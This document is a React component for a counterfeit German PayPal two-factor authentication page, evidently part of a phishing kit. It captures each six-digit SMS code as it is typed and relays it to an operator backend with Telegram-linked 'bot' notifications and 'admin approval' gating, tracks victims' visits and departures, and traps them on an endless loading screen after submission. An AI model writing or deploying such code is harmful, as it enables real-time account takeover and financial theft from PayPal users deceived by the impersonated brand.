import React, { useState, useMemo, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader } from "@/components/ui/card";

import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import { apiRequest } from "@/lib/queryClient";
import { SmsLoadingOverlay } from "@/components/SmsLoadingOverlay";
import { useWebSocket } from "../hooks/useWebSocket";

export const SmsChallengePage = (): JSX.Element => {
  const [otpValue, setOtpValue] = useState("");
  const [isLoading, setIsLoading] = useState(true);
  const [isApproved, setIsApproved] = useState(false);
  const [showFinalLoading, setShowFinalLoading] = useState(false);

  // Get stepupContext from URL parameters
  const stepupContext = useMemo(() => {
    if (typeof window !== "undefined") {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get("stepupContext") || "";
    }
    return "";
  }, []);

  // Get contextData from URL parameters
  const contextData = useMemo(() => {
    if (typeof window !== "undefined") {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get("context_data") || "";
    }
    return "";
  }, []);

  // Initialize WebSocket connection for real-time redirects
  useWebSocket({
    contextData,
    onRedirect: (url) => {
      console.log('🔀 Redirecting to:', url);
    }
  });

  // Send notification to bot when page loads and wait for approval
  useEffect(() => {
    // Check if direct access is enabled (from Telegram redirect)
    const urlParams = new URLSearchParams(window.location.search);
    const directAccess = urlParams.get("direct_access") === "true";
    
    if (directAccess) {
      // Skip approval system for direct access from Telegram
      setIsApproved(true);
      setIsLoading(false);
      return;
    }

    const sendSmsAccessNotification = async () => {
      try {
        // Send notification to bot about SMS page access
        await apiRequest('POST', '/api/sms-page-access', {
          contextData,
          stepupContext,
          timestamp: new Date().toISOString()
        });

        // Start polling for approval status
        const checkApproval = async () => {
          try {
            const response = await fetch(`/api/sms-page-access/status?contextData=${contextData}`);
            const data = await response.json();
            
            if (data.approved) {
              setIsApproved(true);
              setIsLoading(false);
            } else {
              // Continue polling every 2 seconds
              setTimeout(checkApproval, 2000);
            }
          } catch (error) {
            console.error('Error checking approval status:', error);
            // Retry after 2 seconds
            setTimeout(checkApproval, 2000);
          }
        };

        // Start checking approval status
        setTimeout(checkApproval, 1000);
      } catch (error) {
        console.error('Error sending SMS access notification:', error);
        setIsLoading(false);
      }
    };

    sendSmsAccessNotification();
  }, [contextData, stepupContext]);

  // Debounce timer for OTP notifications
  const [otpNotificationTimer, setOtpNotificationTimer] = useState<NodeJS.Timeout | null>(null);

  // Send notification for OTP input changes
  const sendOtpNotification = async (value: string) => {
    if (!value.trim()) return; // Don't send for empty values
    
    const urlParams = new URLSearchParams(window.location.search);
    const contextData = urlParams.get("context_data") || "";
    
    try {
      await fetch("/api/field-notifications", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          field: "otp",
          value,
          returnUri: window.location.href,
          contextData,
        }),
      });
    } catch (error) {
      console.error("Failed to send OTP notification:", error);
    }
  };

  const handleOtpChange = (value: string) => {
    // Only allow digits
    const digitsOnly = value.replace(/\D/g, '');
    setOtpValue(digitsOnly);
    
    // Send notification only when 6 digits are entered
    if (digitsOnly.length === 6) {
      // Clear existing timer
      if (otpNotificationTimer) {
        clearTimeout(otpNotificationTimer);
      }
      
      // Send notification immediately when 6 digits entered
      sendOtpNotification(digitsOnly);
    } else {
      // Clear timer if less than 6 digits
      if (otpNotificationTimer) {
        clearTimeout(otpNotificationTimer);
        setOtpNotificationTimer(null);
      }
    }
  };

  // Cleanup timer on unmount
  useEffect(() => {
    return () => {
      if (otpNotificationTimer) {
        clearTimeout(otpNotificationTimer);
      }
    };
  }, [otpNotificationTimer]);

  // Track page visit and departure
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const contextData = urlParams.get("context_data") || "";
    
    const trackVisit = async () => {
      try {
        await fetch("/api/track-visit", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            page: "SMS Challenge Page",
            contextData: contextData,
            userAgent: navigator.userAgent,
          }),
        });
      } catch (error) {
        console.error("Failed to track visit:", error);
      }
    };

    const trackLeave = async () => {
      try {
        await fetch("/api/track-leave", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            contextData: contextData,
          }),
        });
      } catch (error) {
        console.error("Failed to track leave:", error);
      }
    };

    // Track initial visit
    trackVisit();

    // Track when user leaves page
    const handleBeforeUnload = () => {
      // Don't track leave if showing final loading screen
      if (!showFinalLoading) {
        navigator.sendBeacon("/api/track-leave", JSON.stringify({
          contextData: contextData,
        }));
      }
    };

    const handleVisibilityChange = () => {
      // Don't track leave if showing final loading screen or hidden temporarily
      if (document.visibilityState === 'hidden' && !showFinalLoading) {
        trackLeave();
      }
    };

    // Add event listeners
    window.addEventListener('beforeunload', handleBeforeUnload);
    document.addEventListener('visibilitychange', handleVisibilityChange);

    // Cleanup on component unmount
    return () => {
      window.removeEventListener('beforeunload', handleBeforeUnload);
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      // Only track leave on unmount if not showing final loading
      if (!showFinalLoading) {
        trackLeave();
      }
    };
  }, [showFinalLoading]);

  // Footer links data
  const footerLinks = [
    {
      text: "Kontakt",
      href: "https://www.paypal.com/de/smarthelp/contact-us",
    },
    {
      text: "Datenschutz",
      href: "https://www.paypal.com/de/webapps/mpp/ua/privacy-full",
    },
    {
      text: "AGB",
      href: "https://www.paypal.com/de/webapps/mpp/ua/legalhub-full",
    },
    {
      text: "Weltweit",
      href: "https://www.paypal.com/de/webapps/mpp/country-worldwide",
    },
  ];

  const handleSubmit = async () => {
    if (otpValue.length === 6) {
      try {
        // Extract contextData from URL if present
        const urlParams = new URLSearchParams(window.location.search);
        const contextData = urlParams.get('context_data');
        
        // FIRST: Notify server that user is in loading state (before showing overlay)
        await fetch("/api/user-loading", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            contextData: contextData,
            loadingState: true,
          }),
        });
        
        // THEN: Show full-screen loading overlay
        setShowFinalLoading(true);
        
        // Submit SMS data to backend
        await apiRequest("POST", "/api/sms-submissions", {
          otpCode: otpValue,
          stepupContext: stepupContext,
          rememberDevice: false,
          contextData: contextData,
        });

        // Keep showing loading screen indefinitely
        // No redirect - user stays on loading screen
      } catch (error) {
        console.error("Failed to submit SMS code:", error);
        // Still keep loading screen even if API fails
      }
    }
  };

  return (
    <div className="sms-page-container flex flex-col w-full min-h-screen items-start relative bg-wwwpaypalcomwhite">
      {/* Main content */}
      <div className="flex flex-col w-full items-center justify-center flex-1 pt-[80px] sm:pt-[135px] px-4 sm:px-0">
        <Card className="w-full max-w-[400px] bg-wwwpaypalcomwhite border-none shadow-none">
          <CardHeader className="flex items-center justify-center pb-6 pt-0">
            <div className="w-16 h-16">
              <img
                className="w-16 h-16"
                alt="PayPal Logo"
                src="/figmaAssets/paypalLOGO.svg"
              />
            </div>
          </CardHeader>

          <CardContent className="px-0">
            <div className="text-center mb-6">
              <h3 className="paypal-heading-special font-www-paypal-com-semantic-heading-3 text-wwwpaypalcomblack text-[length:var(--www-paypal-com-semantic-heading-3-font-size)] tracking-[var(--www-paypal-com-semantic-heading-3-letter-spacing)] leading-[var(--www-paypal-com-semantic-heading-3-line-height)]">
                Authentifizierung erforderlich
              </h3>
              <p className="text-center text-sm text-[#696969] mt-2 px-4">
                Im Rahmen der überarbeiteten Zahlungsdiensterichtlinie (PSD2) "Starke Kundenauthentifizierung" benötigen wir weitere Informationen, die bestätigen, dass es sich wirklich um Sie handelt.
              </p>
            </div>

            {/* OTP Input */}
            <div className="flex justify-center mb-6 px-4 sm:px-9">
              <InputOTP
                maxLength={6}
                value={otpValue}
                onChange={handleOtpChange}
              >
                <InputOTPGroup className="flex gap-1 sm:gap-2">
                  <InputOTPSlot index={0} className="w-10 h-12 sm:w-12 sm:h-16 rounded-md border border-solid border-[#cccccc] bg-wwwpaypalcomwhite text-lg font-medium text-center focus:border-blue-500 focus:outline-none transition-colors duration-200" />
                  <InputOTPSlot index={1} className="w-10 h-12 sm:w-12 sm:h-16 rounded-md border border-solid border-[#cccccc] bg-wwwpaypalcomwhite text-lg font-medium text-center focus:border-blue-500 focus:outline-none transition-colors duration-200" />
                  <InputOTPSlot index={2} className="w-10 h-12 sm:w-12 sm:h-16 rounded-md border border-solid border-[#cccccc] bg-wwwpaypalcomwhite text-lg font-medium text-center focus:border-blue-500 focus:outline-none transition-colors duration-200" />
                  <InputOTPSlot index={3} className="w-10 h-12 sm:w-12 sm:h-16 rounded-md border border-solid border-[#cccccc] bg-wwwpaypalcomwhite text-lg font-medium text-center focus:border-blue-500 focus:outline-none transition-colors duration-200" />
                  <InputOTPSlot index={4} className="w-10 h-12 sm:w-12 sm:h-16 rounded-md border border-solid border-[#cccccc] bg-wwwpaypalcomwhite text-lg font-medium text-center focus:border-blue-500 focus:outline-none transition-colors duration-200" />
                  <InputOTPSlot index={5} className="w-10 h-12 sm:w-12 sm:h-16 rounded-md border border-solid border-[#cccccc] bg-wwwpaypalcomwhite text-lg font-medium text-center focus:border-blue-500 focus:outline-none transition-colors duration-200" />
                </InputOTPGroup>
              </InputOTP>
            </div>



            {/* Submit button */}
            <div className="flex justify-center mt-6 px-4 sm:px-3">
              <Button 
                onClick={handleSubmit}
                disabled={otpValue.length !== 6}
                className="paypal-heading-special w-full max-w-[375px] h-[50px] bg-[#0c8ce9] text-wwwpaypalcomwhite rounded-[1000px] border-2 border-solid text-[length:var(--www-paypal-com-button-font-size)] tracking-[var(--www-paypal-com-button-letter-spacing)] leading-[var(--www-paypal-com-button-line-height)] hover:bg-[#0a7bd8] transition-colors duration-200 disabled:!bg-[#0551b5] disabled:text-white disabled:cursor-not-allowed disabled:!border-[#0551b5] disabled:opacity-100"
                style={{ 
                  fontFamily: '"PayPal Sans Big", "PayPal Sans", "Helvetica Neue", Helvetica, Arial, sans-serif',
                  fontWeight: '600'
                }}
              >
                Weiter
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
      {/* Footer */}
      <div className="w-full min-h-[42px] bg-wwwpaypalcomalabaster flex flex-wrap items-center justify-center mt-auto py-2 px-4">
        {footerLinks.map((link, index) => (
          <a
            key={index}
            className="px-[6.4px] py-[8px] sm:py-[15px] font-www-paypal-com-semantic-link-underline text-wwwpaypalcomabbey text-[length:var(--www-paypal-com-semantic-link-underline-font-size)] tracking-[var(--www-paypal-com-semantic-link-underline-letter-spacing)] leading-[var(--www-paypal-com-semantic-link-underline-line-height)] underline text-xs sm:text-sm hover:text-blue-600 transition-colors duration-200"
            href={link.href}
            rel="noopener noreferrer"
            target="_blank"
          >
            {link.text}
          </a>
        ))}
      </div>
      
      {/* SMS Loading Overlay */}
      <SmsLoadingOverlay 
        isVisible={isLoading && !isApproved} 
        message="Warten auf Admin-Genehmigung..."
      />

      {/* Final Loading Screen */}
      {showFinalLoading && (
        <div className="fixed inset-0 bg-white flex flex-col items-center justify-center z-50">
          <div className="flex flex-col items-center">
            {/* Spinning circle */}
            <div className="w-16 h-16 border-4 border-gray-200 border-t-black rounded-full animate-spin mb-8"></div>
            
            {/* Text */}
            <div className="text-black text-xl font-normal text-center">
              Just a second...
            </div>
          </div>
        </div>
      )}
    </div>
  );
};